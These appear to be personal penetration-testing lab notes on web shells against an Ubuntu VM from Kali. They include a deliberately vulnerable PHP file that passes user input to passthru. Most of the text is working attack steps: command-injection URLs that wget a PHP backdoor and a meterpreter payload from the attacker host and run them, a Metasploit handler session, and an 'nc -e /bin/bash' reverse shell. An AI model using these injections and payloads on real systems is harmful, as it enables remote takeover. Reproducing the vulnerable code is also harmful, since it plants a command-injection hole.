Web Shells

**********************************************************************************************************************************

CASE 1 : /var/www is writable

In Ubuntu Server
userver64@userver64:~$ sudo chmod -R 777 /var/www/
userver64@userver64:~$ ls -la /var/www/html/
total 24
drwxrwxrwx 2 root root  4096 Mar 11 14:48 .
drwxrwxrwx 3 root root  4096 Mar 11 14:00 ..
-rwxrwxrwx 1 root root 11321 Mar 11 14:00 index.html
-rwxrwxrwx 1 root root   146 Mar 11 14:48 list.php
userver64@userver64:~$

In Browser
http://192.168.1.13/list.php?path=/
File in path are:
	total 96K
drwxr-xr-x  23 root root 4.0K Mar 11 14:00 .
drwxr-xr-x  23 root root 4.0K Mar 11 14:00 ..
drwxr-xr-x   2 root root 4.0K Mar 11 14:00 bin
drwxr-xr-x   3 root root 4.0K Mar 11 14:03 boot
drwxr-xr-x  20 root root 4.3K Mar 11 14:41 dev
drwxr-xr-x  92 root root 4.0K Mar 11 14:07 etc
drwxr-xr-x   3 root root 4.0K Mar 11 14:03 home
lrwxrwxrwx   1 root root   32 Mar 11 13:44 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  22 root root 4.0K Mar 11 14:00 lib
drwxr-xr-x   2 root root 4.0K Mar 11 13:43 lib64
drwx------   2 root root  16K Mar 11 13:43 lost+found
drwxr-xr-x   3 root root 4.0K Mar 11 13:43 media
drwxr-xr-x   2 root root 4.0K Feb 15 12:19 mnt
drwxr-xr-x   2 root root 4.0K Feb 15 12:19 opt
dr-xr-xr-x 197 root root    0 Mar 11 14:41 proc
drwx------   3 root root 4.0K Mar 11 14:48 root
drwxr-xr-x  24 root root  880 Mar 11 14:43 run
drwxr-xr-x   2 root root  12K Mar 11 14:07 sbin
drwxr-xr-x   2 root root 4.0K Jan 14 07:06 snap
drwxr-xr-x   2 root root 4.0K Feb 15 12:19 srv
dr-xr-xr-x  13 root root    0 Mar 11 14:41 sys
drwxrwxrwt   9 root root 4.0K Mar 11 14:49 tmp
drwxr-xr-x  10 root root 4.0K Mar 11 13:43 usr
drwxr-xr-x  14 root root 4.0K Mar 11 14:01 var
lrwxrwxrwx   1 root root   29 Mar 11 13:44 vmlinuz -> boot/vmlinuz-4.4.0-62-generic

http://192.168.1.13/list.php?path=/;pwd
File in path are:
	total 96K
drwxr-xr-x  23 root root 4.0K Mar 11 14:00 .
drwxr-xr-x  23 root root 4.0K Mar 11 14:00 ..
drwxr-xr-x   2 root root 4.0K Mar 11 14:00 bin
drwxr-xr-x   3 root root 4.0K Mar 11 14:03 boot
drwxr-xr-x  20 root root 4.3K Mar 11 14:41 dev
drwxr-xr-x  92 root root 4.0K Mar 11 14:07 etc
drwxr-xr-x   3 root root 4.0K Mar 11 14:03 home
lrwxrwxrwx   1 root root   32 Mar 11 13:44 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  22 root root 4.0K Mar 11 14:00 lib
drwxr-xr-x   2 root root 4.0K Mar 11 13:43 lib64
drwx------   2 root root  16K Mar 11 13:43 lost+found
drwxr-xr-x   3 root root 4.0K Mar 11 13:43 media
drwxr-xr-x   2 root root 4.0K Feb 15 12:19 mnt
drwxr-xr-x   2 root root 4.0K Feb 15 12:19 opt
dr-xr-xr-x 198 root root    0 Mar 11 14:41 proc
drwx------   3 root root 4.0K Mar 11 14:48 root
drwxr-xr-x  24 root root  880 Mar 11 14:43 run
drwxr-xr-x   2 root root  12K Mar 11 14:07 sbin
drwxr-xr-x   2 root root 4.0K Jan 14 07:06 snap
drwxr-xr-x   2 root root 4.0K Feb 15 12:19 srv
dr-xr-xr-x  13 root root    0 Mar 11 14:50 sys
drwxrwxrwt   9 root root 4.0K Mar 11 14:51 tmp
drwxr-xr-x  10 root root 4.0K Mar 11 13:43 usr
drwxr-xr-x  14 root root 4.0K Mar 11 14:01 var
lrwxrwxrwx   1 root root   29 Mar 11 13:44 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
/var/www/html

In Kali
root@kali:/usr/share/webshells# cd php/
root@kali:/usr/share/webshells/php# ls
findsock.c  php-backdoor.php  php-findsock-shell.php  php-reverse-shell.php  qsd-php-backdoor.php  simple-backdoor.php
root@kali:/usr/share/webshells/php# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.9  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::20c:29ff:feb6:5bd  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:b6:05:bd  txqueuelen 1000  (Ethernet)
        RX packets 737603  bytes 941677491 (898.0 MiB)
        RX errors 359033  dropped 356  overruns 0  frame 0
        TX packets 580534  bytes 55365972 (52.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2024

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 664  bytes 224117 (218.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 664  bytes 224117 (218.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:/usr/share/webshells/php# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.1.13 - - [11/Mar/2017 17:43:38] "GET /php-backdoor.php HTTP/1.1" 200 -

http://192.168.1.13/list.php?path=/;wget http://192.168.1.9:8000/php-backdoor.php;
http://192.168.1.13/list.php?path=.
File in path are:
	total 28K
drwxrwxrwx 2 root     root     4.0K Mar 11 14:55 .
drwxrwxrwx 3 root     root     4.0K Mar 11 14:00 ..
-rwxrwxrwx 1 root     root      12K Mar 11 14:00 index.html
-rwxrwxrwx 1 root     root      146 Mar 11 14:48 list.php
-rw-r--r-- 1 www-data www-data 2.8K Aug 17  2015 php-backdoor.php

Use this shell instead
https://github.com/dberliner/php-backdoor

http://192.168.1.13/php-backdoor.php?d=/
http://192.168.1.13/php-backdoor.php?f=/var/www/html/list.php
<html>

<body>

	<b>File in path are: </b><br><pre>
	<?php

		$cmd = "ls -alh ".$_REQUEST['path'];
		passthru($cmd);

	?></pre>
</body>

</html>

**********************************************************************************************************************************

CASE 2 : /var/www is not writable

In Kali
root@kali:~/Desktop# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.9 -f raw > php-meter.php
No platform was selected, choosing Msf::Module::Platform::PHP from the payload
No Arch selected, selecting Arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 947 bytes

root@kali:~/Desktop# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.1.13 - - [11/Mar/2017 18:44:10] "GET /php-meter.php HTTP/1.1" 200 -

In Browser
http://192.168.1.13/list.php?path=.;wget -O /tmp/php-meter.php http://192.168.1.9:8000/php-meter.php
http://192.168.1.13/list.php?path=/tmp
File in path are:
	total 36K
drwxrwxrwt  9 root     root     4.0K Mar 11 16:04 .
drwxr-xr-x 23 root     root     4.0K Mar 11 14:00 ..
drwxrwxrwt  2 root     root     4.0K Mar 11 14:41 .ICE-unix
drwxrwxrwt  2 root     root     4.0K Mar 11 14:41 .Test-unix
drwxrwxrwt  2 root     root     4.0K Mar 11 14:41 .X11-unix
drwxrwxrwt  2 root     root     4.0K Mar 11 14:41 .XIM-unix
drwxrwxrwt  2 root     root     4.0K Mar 11 14:41 .font-unix
-rw-r--r--  1 www-data www-data    0 Mar 11 16:04 php-meter.php
drwx------  3 root     root     4.0K Mar 11 14:41 systemd-private-9fc06b584cdb415f965e03bd387a16ab-systemd-timesyncd.service-sBbdg6
drwx------  2 root     root     4.0K Mar 11 14:41 vmware-root
http://192.168.1.13/list.php?path=/tmp;php -f /tmp/php-meter.php;

In MSF
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.9
LHOST => 192.168.1.9
msf exploit(handler) > exploit

[*] Started reverse TCP handler on 192.168.1.9:4444
[*] Starting the payload handler...
[*] Sending stage (33721 bytes) to 192.168.1.13
[*] Meterpreter session 1 opened (192.168.1.9:4444 -> 192.168.1.13:52876) at 2017-03-11 19:25:43 -0500

meterpreter > sysinfo
Computer    : userver64
OS          : Linux userver64 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64
Meterpreter : php/linux
meterpreter > getuid
Server username: www-data (33)
meterpreter > pwd
/var/www/html
meterpreter > ls
Listing: /var/www/html
======================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100777/rwxrwxrwx  11321  fil   2017-03-11 17:49:59 -0500  index.html
100777/rwxrwxrwx  146    fil   2017-03-11 17:49:59 -0500  list.php
100644/rw-r--r--  13585  fil   2017-03-11 18:15:27 -0500  php-backdoor.php
100644/rw-r--r--  947    fil   2017-03-11 18:56:25 -0500  php-meter.php

meterpreter >

**********************************************************************************************************************************

CASE 3 : /var/www is not writable and /tmp/ is also not accessible
Solution : Netcat Reverse Connect
No files are created and no files are written to the victim machine

In Browser
http://192.168.1.13/list.php?path=/; nc -e /bin/bash 192.168.1.9 10000

In Kali
$ nc -l -p 10000 -v

**********************************************************************************************************************************

CASE 3 : /var/www is not writable and /tmp/ is also not accessible and has a stripped down version of netcat which dowes not support -e

http://securityweekly.com/2011/10/23/python-one-line-shell-code/
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

In Kali
$ python -c "print 'Hello World'"
Hello World

http://192.168.1.13/list.php?path=/;whereis python
http://192.168.1.13/list.php?path=/;whereis php
http://192.168.1.13/list.php?path=/;whereis perl
http://192.168.1.13/list.php?path=/;python -c "print 'Hello World'"
